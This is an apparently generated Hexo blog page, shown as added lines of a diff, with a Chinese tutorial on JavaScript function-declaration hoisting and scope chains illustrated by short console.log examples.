+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	function funtest()&#123;</span><br><span class="line">		console.log("funtest");</span><br><span class="line">	&#125;</span><br><span class="line">	funtest();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>关键字function+函数名称+函数体，这种方式定义的函数就是我们所说的函数声明。可以看到这种方式定义的函数，不管调用执行它的代码在它前面还是后面都能正确的找到相关函数的引用，并执行。</p>
+<h3 id="链式作用域"><a href="#链式作用域" class="headerlink" title="链式作用域"></a>链式作用域</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a=1;</span><br><span class="line">	function func_outer()&#123;</span><br><span class="line">		var a=2;</span><br><span class="line">		function func_inner()&#123;</span><br><span class="line">			var a=3;</span><br><span class="line">			console.log(a);	//3</span><br><span class="line">		&#125;</span><br><span class="line">		func_inner();</span><br><span class="line">	&#125;</span><br><span class="line">	func_outer();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a=1;</span><br><span class="line">	function func_outer()&#123;</span><br><span class="line">		var a=2;</span><br><span class="line">		function func_inner()&#123;</span><br><span class="line">			console.log(a);	//2</span><br><span class="line">		&#125;</span><br><span class="line">		func_inner();</span><br><span class="line">	&#125;</span><br><span class="line">	func_outer();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a=1;</span><br><span class="line">	function func_outer()&#123;</span><br><span class="line">		function func_inner()&#123;</span><br><span class="line">			console.log(a);	//1</span><br><span class="line">		&#125;</span><br><span class="line">		func_inner();</span><br><span class="line">	&#125;</span><br><span class="line">	func_outer();</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>当一个函数内部用到一个变量时，首先会在当前函数作用域中查找这个变量，如果当前函数作用域中没有，就逐层往上到上一级函数作用域中查找，一直找到window对象层，只到找到为止，如果找不到就会报变量未定义错误。这就是Javascript的链式作用域。</p>
+<p><img src="https://raw.githubusercontent.com/yangdage/images/master/20160401/js-scope.jpg" alt="js作用域"></p>
+<p>注意，任何函数内未加<strong>var</strong>定义的变量，函数执行的时候都会被提升为全局变量。直属于<strong>window</strong>对象，而且永驻内存不会被释放，除非手动删除，或关闭浏览器，window对象已有的该属性会被覆盖。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><br><span class="line">	var a=1;</span><br><span class="line">	function func_outer()&#123;</span><br><span class="line">		a=2;</span><br><span class="line">		function func_inner()&#123;</span><br><span class="line">			;</span><br><span class="line">		&#125;</span><br><span class="line">		func_inner();</span><br><span class="line">	&#125;</span><br><span class="line">	func_outer();</span><br><span class="line">	console.log(a);	//2</span><br><span class="line"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog/javascript/javascript/javascript中声明提升和函数作用域.html" data-id="cin79x0cc00039cqel2vsth0e" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+<!--
+
+-->
+
+<!-- 多说评论框 start -->
+<div class="ds-thread" data-thread-key="post-javascript/javascript中声明提升和函数作用域" data-title="Javascript中声明提升和链式作用域" data-url="undefined"></div>
+<!-- 多说评论框 end -->
+<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+var duoshuoQuery = {short_name:"yangdage"};
+(function() {
+  var ds = document.createElement('script');
+  ds.type = 'text/javascript';ds.async = true;
+  ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+  ds.charset = 'UTF-8';
+  (document.getElementsByTagName('head')[0] 
+   || document.getElementsByTagName('body')[0]).appendChild(ds);
+})();
+</script>
+<!-- 多说公共JS代码 end -->
+
+<!-- 搜索引擎优化 start-->
+
+<!-- 搜索引擎优化 end-->
+  
+
+
+  <nav id="page-nav">
+    <a class="extend prev" rel="prev" href="/blog/">&laquo; __('prev')</a><a class="page-number" href="/blog/">1</a><span class="page-number current">2</span>
+  </nav>
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/blog/categories/java/">java</a></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/javascript/">javascript</a></li><li class="category-list-item"><a class="category-list-link" href="/blog/categories/learning/">学习</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/04/">四月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2016/03/">三月 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/08/">八月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/05/">五月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/04/">四月 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/blog/archives/2015/03/">三月 2015</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/blog/learning/learning/go-gob.html">Go中gob序列化反序列化</a>
+          </li>
+        
+          <li>
+            <a href="/blog/learning/learning/markdown-mathjax.html">Mathjax in Markdown</a>
+          </li>
+        
+          <li>
+            <a href="/blog/java/java/Java列表组合排序.html">Java中List列表排序</a>
+          </li>
+        
+          <li>
+            <a href="/blog/javascript/javascript/函数声明-表达式-匿名函数.html">JS里的函数声明/匿名函数/函数表达式/立即执行函数/立即调用表达式</a>
+          </li>
+        
+          <li>
+            <a href="/blog/learning/learning/vim-xml-format.html">Vim下XML文件格式化</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2016 yangdage<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/blog/" class="mobile-nav-link">Home</a>
+  
+    <a href="/blog/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="http://apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script> <script type="text/javascript">
+//<![CDATA[
+if (typeof jQuery == 'undefined') {
+document.write(unescape("%3Cscript src='/js/jquery-2.0.3.min.js' type='text/javascript'%3E%3C/script%3E"));
+}
+// ]]>
+</script>
+
+
+  <link rel="stylesheet" href="/blog/fancybox/jquery.fancybox.css">
+  <script src="/blog/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/blog/js/script.js"></script>
+
+  </div><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+</body>
+</html>
